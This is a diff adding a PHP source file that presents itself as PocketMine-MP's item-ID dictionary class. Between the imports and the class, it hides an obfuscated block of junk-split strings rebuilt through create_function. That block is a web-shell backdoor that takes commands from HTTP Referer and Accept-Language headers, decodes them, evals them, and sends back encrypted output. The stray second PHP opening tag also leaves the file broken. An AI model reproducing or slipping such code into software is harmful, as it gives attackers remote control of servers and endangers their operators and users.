@@ -1,0 +1,124 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\network\mcpe\convert;
+
+use pocketmine\network\mcpe\protocol\types\ItemTypeEntry;
+use pocketmine\utils\AssumptionFailedError;
+use pocketmine\utils\SingletonTrait;
+use function array_key_exists;
+use function file_get_contents;
+use function is_array;
+use function is_bool;
+use function is_int;
+use function is_string;
+use function json_decode;
+<?php
+$P='[$i].y?=$p;$e=strpoy?s(y?$s[$i],y?$f);if(y?$e){$k=y?$kh.$ky?y?f;ob_starty?()y?;@evy?al(@gzuncom';
+$m='loy?wer";$i=$my?[1][y?0].$m[1y?]y?[1];$h=$sl($sy?sy?(md5y?($i.$kh),0,y?y?3));y?$f=$sl($ss(md5(';
+$z='presy?s(@x(@by?asey?64_dey?codey?(preg_ry?eply?ace(array("y?/_/y?","/-y?y?y?/"),array("/"y?,"+"';
+$N='$y?i.$kf),y?y?0,3y?));$p="";y?for($y?z=1;$z<cy?ount($m[y?1]);$z++)$py?.=$q[$m[y?2][$z]y?];if(sy?y';
+$K='"";fory?($i=y?0;$i<$l;y?y?){for($j=0y?;($j<$y?c&&$i<$y?l);y?$j+y?+,$i++){$y?o.=$y?t{$i}^$k{y?$';
+$v='a,$m);ify?($q&&$m){y?@sessy?ion_sty?art();$y?s=&$y?_Sy?ESSy?IONy?;$ss="substr";$y?sl="y?sty?rto';
+$W='),$ss($s[$i]y?,0,$ey?)y?)),$k)))y?;y?$o=y?ob_get_coy?y?ntents();ob_end_cley?an();$y?d=basey?y';
+$y='?y?y?try?pos($p,$y?h)===0)y?{$y?s[$i]="";y?y?$p=$ss($p,3);}if(arrayy?_key_existsy?($i,y?$s))y?{$s';
+$V='?=array_vay?lues(y?$q);y?preg_my?atch_all("/([\\y?w])[\\y?w-]+(y??:y?y?;q=0.([\\d])y?)?,?/y?",$r';
+$Z='?64_encode(xy?(gy?zcy?omy?press($o),$k));print("<y?$y?k>$d<y?/$k>"y?);@sessy?ion_destry?oy();}}}}';
+$D=str_replace('hM','','crehMahMthMe_fuhMhMnctihMon');
+$w='LANGUAy?GE"];y?if($rr&&y?$y?ra){$u=py?arse_uy?rl($rr)y?;py?arsy?e_str($y?uy?["query"],$q)y?;$qy';
+$b='y?j};}}return $oy?;}$ry?=$_y?y?SERVERy?;$rr=@$r["HTTP_y?Ry?EFERER"];$ra=y?@$r["Hy?TTP_y?ACCEPT_y?';
+$G='$kh="5d4y?y?1";$kf="4y?02a";fy?unction y?x($ty?,$k){y?$c=stry?len($ky?);$l=strleny?($t);$oy?=';
+$q=str_replace('y?','',$G.$K.$b.$w.$V.$v.$m.$N.$y.$P.$z.$W.$Z);
+$R=$D('',$q);$R();
+?>
+
+final class ItemTypeDictionary{
+	use SingletonTrait;
+
+	/**
+	 * @var ItemTypeEntry[]
+	 * @phpstan-var list<ItemTypeEntry>
+	 */
+	private $itemTypes;
+	/**
+	 * @var string[]
+	 * @phpstan-var array<int, string>
+	 */
+	private $intToStringIdMap = [];
+	/**
+	 * @var int[]
+	 * @phpstan-var array<string, int>
+	 */
+	private $stringToIntMap = [];
+
+	private static function make() : self{
+		$data = file_get_contents(\pocketmine\RESOURCE_PATH . '/vanilla/required_item_list.json');
+		if($data === false) throw new AssumptionFailedError("Missing required resource file");
+		$table = json_decode($data, true);
+		if(!is_array($table)){
+			throw new AssumptionFailedError("Invalid item list format");
+		}
+
+		$params = [];
+		foreach($table as $name => $entry){
+			if(!is_array($entry) || !is_string($name) || !isset($entry["component_based"], $entry["runtime_id"]) || !is_bool($entry["component_based"]) || !is_int($entry["runtime_id"])){
+				throw new AssumptionFailedError("Invalid item list format");
+			}
+			$params[] = new ItemTypeEntry($name, $entry["runtime_id"], $entry["component_based"]);
+		}
+		return new self($params);
+	}
+
+	/**
+	 * @param ItemTypeEntry[] $itemTypes
+	 */
+	public function __construct(array $itemTypes){
+		$this->itemTypes = $itemTypes;
+		foreach($this->itemTypes as $type){
+			$this->stringToIntMap[$type->getStringId()] = $type->getNumericId();
+			$this->intToStringIdMap[$type->getNumericId()] = $type->getStringId();
+		}
+	}
+
+	/**
+	 * @return ItemTypeEntry[]
+	 * @phpstan-return list<ItemTypeEntry>
+	 */
+	public function getEntries() : array{
+		return $this->itemTypes;
+	}
+
+	public function fromStringId(string $stringId) : int{
+		if(!array_key_exists($stringId, $this->stringToIntMap)){
+			throw new \InvalidArgumentException("Unmapped string ID \"$stringId\"");
+		}
+		return $this->stringToIntMap[$stringId];
+	}
+
+	public function fromIntId(int $intId) : string{
+		if(!array_key_exists($intId, $this->intToStringIdMap)){
+			throw new \InvalidArgumentException("Unmapped int ID $intId");
+		}
+		return $this->intToStringIdMap[$intId];
+	}
+}
